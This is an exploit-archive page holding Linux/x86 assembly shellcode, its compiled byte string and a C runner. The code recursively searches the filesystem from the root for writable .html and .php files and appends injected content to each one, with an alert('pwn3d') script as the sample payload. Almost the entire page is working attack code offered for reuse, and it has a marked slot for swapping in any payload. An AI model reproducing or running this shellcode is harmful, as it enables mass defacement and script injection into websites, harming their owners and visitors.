<html><head><title>Linux/x86 - Search php,html writable files and add your code - 380+ bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; Title : Linux/x86 Search php,html writable files and add your code.
; Date  : 2011-10-24 
; Author: rigan - imrigan [sobachka ] gmail.com
; Size  : 380 bytes + your code.
;
; Note  : This shellcode writes down your code in the end of 
;         found files. Your code will be added only .html and .php 
;         files. Search for files is carried out recursively.  

 

BITS 32

section .text
global _start
_start:
;======================================================================;
;                               main                                   ;
;======================================================================;
              ; chdir(&quot;/&quot;)  
                xor eax, eax
                push eax
                sub esp, BYTE 0x1
                mov BYTE [esp], 0x2f
                mov ebx, esp
                mov al, 12
                int 0x80
            
                xor eax, eax
                push eax
                sub esp, BYTE 0x1
                mov BYTE [esp], 0x2e
               
                jmp SHORT .exit

.jmp_search: 
                jmp SHORT search      

.exit:
                call .jmp_search
         
              ; exit(0)   
                xor eax, eax
                xor ebx, ebx
                mov al, 1
                int 0x80

;======================================================================;
;                               inject                                 ;
;======================================================================;
inject:
               ; open(&quot;file&quot;, O_WRONLY)
                xor eax, eax
                mov ebx, edi
                xor ecx, ecx
                mov cl, 2
                mov al, 5
                int 0x80
                                               
              ; lseek(fd, 0, SEEK_END)
                xor ebx, ebx
                mov ebx, eax
                xor ecx, ecx
                xor eax, eax
                cdq
                mov dl, 2
                mov al, 19
                int 0x80
    
              ; write(fd, your_code, sizeof(your_code))  
                xor eax, eax
                mov ecx, esi
                mov dl, 43   ; &lt;- TO CHANGE THE SIZE HERE.
                mov al, 4
                int 0x80 

              ; close(fd)
                xor eax, eax
                xor ebx, ebx
                mov al, 6
                int 0x80 
              
                ret
                
;======================================================================;
;                               substr                                 ;
;======================================================================;
        
substr:       
                xor eax, eax
                xor ebx, ebx
                xor ecx, ecx
                cdq

loop_1: 
                inc edx
                
              ; edi contains the filename address
              ; esi contains the substring address 
                mov BYTE bl, [edi + edx] 
        
                test bl, bl 
                jz not_found
                
                cmp BYTE bl, [esi]        
                jne loop_1        

loop_2:        
                mov BYTE al, [esi + ecx]
                mov BYTE bl, [edi + edx]
        
                test al, al
                jz found
        
                inc ecx
        
                inc edx
                cmp bl, al
       
                je loop_2
        
                jmp short not_found

found:
                xor eax, eax
                mov al, 2
        
not_found:
               
                ret
                
;======================================================================;
;                               search                                 ;
;======================================================================;
;This function recursively find all writable files. [php, html]
search:
                push ebp
                mov ebp, esp
                
                
                mov al, 250
                sub esp, eax
               
              ; open(&quot;.&quot;, O_WRONLY)
                xor eax, eax
                xor ecx, ecx
                lea ebx, [ebp + 8]
                mov al, 5
                int 0x80
         
                test eax, eax
                js .old_dirent
      
                mov [ebp + 12], eax    

.while:
              ; readdir(fd, struct old_linux_dirent *dirp, NULL)
                mov esi, [ebp + 12]
                mov ebx, esi
                xor eax, eax
                xor ecx, ecx
                lea ecx, [esp + 100]
                mov al, 89
                int 0x80
         
                test eax, eax
                jnz .l1

              ; closedir(fd)
                xor eax, eax
                xor ebx, ebx
                mov ebx, esi
                mov al, 6
                int 0x80

.old_dirent:         
              ; chdir(&quot;..&quot;)
                xor eax, eax
                push eax
                push WORD 0x2e2e
                mov ebx, esp
                mov al, 12
                int 0x80

                leave 
                ret

.l1:
                lea edx, [esp + 110]
                
                cmp DWORD [edx], 0x636f7270   ; If the /proc filesystem detected...
                je .while                     ; ...next dir
         
                cmp BYTE [edx], 0x2e
                jne .l2
                
                jmp  .while

.l2:
              ; lstat(const char *file, struct stat *buf)
                mov ebx, edx
                mov ecx, esp
                xor eax, eax
                mov al, 196
                int 0x80 
         
                mov cx, 61439
                mov bx, 40959
                inc ecx   
                inc ebx
                mov eax, [esp + 16]
         
                and ax, cx
         
                cmp ax, bx
                jne .l3
                
                jmp .while

.l3:
                xor eax, eax
                push eax
                sub esp, BYTE 0x1
                mov BYTE [esp], 0x2e
         
              ; chdir(&quot;file&quot;)
                mov ebx, edx
                mov al, 12
                int 0x80
         
                test eax, eax
                jne .l4
         
                call search
                
                jmp .while

.l4:   
              ; access(&quot;file&quot;, W_OK)       
                xor eax, eax
                mov ebx, edx
                xor ecx, ecx
                mov cl, 2
                mov al, 33
                int 0x80
         
       
                test eax, eax
                jz .check_html
                
                jmp .while

;======================================================================;
;                               check_html                             ;
;======================================================================;
.check_html:
                xor eax, eax
                push eax
                push DWORD 0x6c6d7468   ; 
                sub esp, BYTE 0x1       ; .html
                mov BYTE [esp], 0x2e    ;  
                
                mov esi, esp         
                mov edi, edx         
                call substr
         
                cmp BYTE al, 2
                je .do_inject

;======================================================================;
;                               check_php                              ;
;======================================================================;               
.check_php:     
                xor eax, eax
                push eax
                push DWORD 0x7068702e   ; .php
               
                mov esi, esp         
                
                call substr
                
                cmp BYTE al, 2
                je .do_inject
                
                jmp .while 

;======================================================================;
;                               do_inject                              ;
;======================================================================;
.do_inject: 
                jmp SHORT .your_code
                
.write:  
                pop  esi    ; Get the address of your code into esi
                
                call inject
                
                jmp .while

;======================================================================;  
;                               your_code                              ;
;======================================================================;
 .your_code:
               call .write
                                                                                              
; Here a place for your code. Its size should be allocated in the
; register dl. Look at the &quot;inject&quot; function.                                                               
                                                                                               
db '&lt;html&gt;&lt;script&gt;alert(&quot;pwn3d&quot;)&lt;script&gt;&lt;/html&gt;' ;&lt;- You can change it.

; Dont't forget to change the size of your code!
------------------------------------------------------------------------ 
                         
             
              Below is presented the shellcode equivalent.
                              

#include &lt;stdio.h&gt;

char shellcode[] = 
                            
    &quot;\x31\xc0\x50\x83\xec\x01\xc6\x04\x24\x2f\x89\xe3\xb0\x0c\xcd\x80&quot;
    &quot;\x31\xc0\x50\x83\xec\x01\xc6\x04\x24\x2e\xeb\x02\xeb\x63\xe8\xf9&quot;
    &quot;\xff\xff\xff\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x31\xc0\x89\xfb\x31&quot;
    &quot;\xc9\xb1\x02\xb0\x05\xcd\x80\x31\xdb\x89\xc3\x31\xc9\x31\xc0\x99&quot;
    &quot;\xb2\x02\xb0\x13\xcd\x80\x31\xc0\x89\xf1\xb2\x2b\xb0\x04\xcd\x80&quot; 
    &quot;\x31\xc0\xb0\x06\xcd\x80\xc3\x31\xc0\x31\xdb\x31\xc9\x99\x42\x8a&quot;
    &quot;\x1c\x17\x84\xdb\x74\x1a\x3a\x1e\x75\xf4\x8a\x04\x0e\x8a\x1c\x17&quot;
    &quot;\x84\xc0\x74\x08\x41\x42\x38\xc3\x74\xf0\xeb\x04\x31\xc0\xb0\x02&quot;
    &quot;\xc3\x55\x89\xe5\xb0\xfa\x29\xc4\x31\xc0\x31\xc9\x8d\x5d\x08\xb0&quot;
    &quot;\x05\xcd\x80\x85\xc0\x78\x22\x89\x45\x0c\x8b\x75\x0c\x89\xf3\x31&quot;
    &quot;\xc0\x31\xc9\x8d\x4c\x24\x64\xb0\x59\xcd\x80\x85\xc0\x75\x19\x31&quot;
    &quot;\xc0\x31\xdb\x89\xf3\xb0\x06\xcd\x80\x31\xc0\x50\x66\x68\x2e\x2e&quot;
    &quot;\x89\xe3\xb0\x0c\xcd\x80\xc9\xc3\x8d\x54\x24\x6e\x81\x3a\x70\x72&quot;
    &quot;\x6f\x63\x74\xc6\x80\x3a\x2e\x75\x05\xe9\xbc\xff\xff\xff\x89\xd3&quot;
    &quot;\x89\xe1\x31\xc0\xb0\xc4\xcd\x80\x66\xb9\xff\xef\x66\xbb\xff\x9f&quot;
    &quot;\x41\x43\x8b\x44\x24\x10\x66\x21\xc8\x66\x39\xd8\x75\x05\xe9\x97&quot;
    &quot;\xff\xff\xff\x31\xc0\x50\x83\xec\x01\xc6\x04\x24\x2e\x89\xd3\xb0&quot;
    &quot;\x0c\xcd\x80\x85\xc0\x75\x0a\xe8\x65\xff\xff\xff\xe9\x79\xff\xff&quot; 
    &quot;\xff\x31\xc0\x89\xd3\x31\xc9\xb1\x02\xb0\x21\xcd\x80\x85\xc0\x74&quot;
    &quot;\x05\xe9\x64\xff\xff\xff\x31\xc0\x50\x68\x68\x74\x6d\x6c\x83\xec&quot;
    &quot;\x01\xc6\x04\x24\x2e\x89\xe6\x89\xd7\xe8\x09\xff\xff\xff\x3c\x02&quot;
    &quot;\x74\x18\x31\xc0\x50\x68\x2e\x70\x68\x70\x89\xe6\xe8\xf6\xfe\xff&quot;
    &quot;\xff\x3c\x02\x74\x05\xe9\x30\xff\xff\xff\xeb\x0b\x5e\xe8\xb9\xfe&quot;
    &quot;\xff\xff\xe9\x23\xff\xff\xff\xe8\xf0\xff\xff\xff&quot;
    // &lt;html&gt;&lt;script&gt;alert(&quot;pwn3d&quot;)&lt;script&gt;&lt;/html&gt;
    &quot;\x3c\x68\x74\x6d\x6c\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c&quot;
    &quot;\x65\x72\x74\x28\x22\x70\x77\x6e\x33\x64\x22\x29\x3c\x73\x63\x72&quot;
    &quot;\x69\x70\x74\x3e\x3c\x2f\x68\x74\x6d\x6c\x3e&quot;;
    
int main()
{   
  printf(&quot;%d\n&quot;, strlen(shellcode));
  (*(void (*)()) shellcode)();
  return 0;
}	   

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
